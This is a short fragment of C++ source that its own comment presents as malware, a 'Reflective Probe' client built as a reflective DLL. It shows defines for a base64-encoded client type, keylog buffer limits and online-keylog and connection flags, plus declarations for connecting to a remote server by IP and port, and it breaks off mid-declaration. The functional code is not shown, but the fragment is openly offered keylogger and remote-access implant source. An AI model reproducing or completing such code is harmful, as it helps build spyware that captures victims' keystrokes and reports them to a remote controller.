/*
 Source code of the Last Malware I'm ever going to write.
 This is the Reflective Probe Source code.
 The Probe Client compiled as the Reflectieve DLL.
 View ReflectiveLoader.cpp for viewing how it connects.
*/
#define NOMINMAX
...
#define CLIENT_TYPE "cmVmbGVjdGl2ZWRsbA==" // base64 for reflectivedll

#define BUFFER 4096
#define NTSTATUS LONG
#define UNLEN 256
#define MAXKEYLOGSZ 10000 // 10 kb maximum size of keylog, After that it will be 

static BOOL connected = FALSE;
static BOOL online_keylogs = FALSE;

namespace Server {
	void ProbeConnect(const char* ip, int Port);
	// void REConnect(void);
	void StartWSA(void);
